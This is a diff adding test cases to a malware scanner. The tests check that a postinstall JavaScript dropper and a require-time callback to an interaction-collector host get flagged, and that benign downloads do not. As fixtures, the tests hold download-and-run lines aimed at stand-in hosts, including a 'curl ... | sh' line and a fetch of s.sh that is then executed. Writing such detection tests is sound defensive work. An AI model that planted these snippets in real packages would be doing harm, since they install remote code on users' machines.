@@ -14280,3 +14280,75 @@ class TestNativeLoadTimeConstructors:
             '    system("curl -s https://x.invalid/p | sh");\n}\n'
         )
         assert self._severity(tmp_path, "update.c", source) is Severity.MEDIUM
+
+
+class TestJavaScriptDownloadThenRun:
+    @staticmethod
+    def _rules(tmp_path, script: str) -> dict[str, str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "package.json").write_text(
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}',
+            encoding="utf-8",
+        )
+        (tmp_path / "install.js").write_text(script, encoding="utf-8")
+        return {
+            f.rule_id: f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+
+    def test_a_fetched_script_handed_to_a_shell(self, tmp_path) -> None:
+        script = (
+            "const fs = require('fs'); const http = require('http');\n"
+            "const { exec } = require('child_process');\n"
+            "http.get('http://x.invalid/s.sh', (r) => {\n"
+            "  r.pipe(fs.createWriteStream('s.sh')).on('finish', () => exec('sh ./s.sh'));\n"
+            "});\n"
+        )
+        assert self._rules(tmp_path, script).get("MALWARE.DROPPER.001") == "CRITICAL"
+
+    def test_a_package_running_its_own_downloaded_binary_is_not(self, tmp_path) -> None:
+        script = (
+            "const fs = require('fs'); const https = require('https');\n"
+            "const child_process = require('child_process');\n"
+            "const binPath = require('path').join(__dirname, 'bin', 'tool');\n"
+            "https.get('https://registry.npmjs.org/@tool/linux-x64/-/linux-x64-1.0.0.tgz', (r) => {\n"
+            "  r.pipe(fs.createWriteStream(binPath)).on('finish', () => {\n"
+            "    child_process.execFileSync(binPath, ['--version']);\n"
+            "  });\n"
+            "});\n"
+        )
+        assert "MALWARE.DROPPER.001" not in self._rules(tmp_path, script)
+
+
+class TestAnInteractionServiceCallback:
+    @staticmethod
+    def _rules(tmp_path, name: str, body: str) -> dict[str, str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        target = tmp_path / name
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(body, encoding="utf-8")
+        return {
+            f.rule_id: f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+
+    BODY: ClassVar[str] = (
+        "const https = require('https');\nhttps.get('https://a1b2c3.oastify.com');\n"
+    )
+
+    def test_a_library_that_pings_a_collector_on_require(self, tmp_path) -> None:
+        assert (
+            self._rules(tmp_path, "index.js", self.BODY).get("SUSPECT.EXFIL.CALLBACK.001") == "HIGH"
+        )
+
+    def test_a_tunnel_is_not_a_callback(self, tmp_path) -> None:
+        body = "const https = require('https');\nhttps.get('https://dev.ngrok-free.app/health');\n"
+        assert "SUSPECT.EXFIL.CALLBACK.001" not in self._rules(tmp_path, "index.js", body)
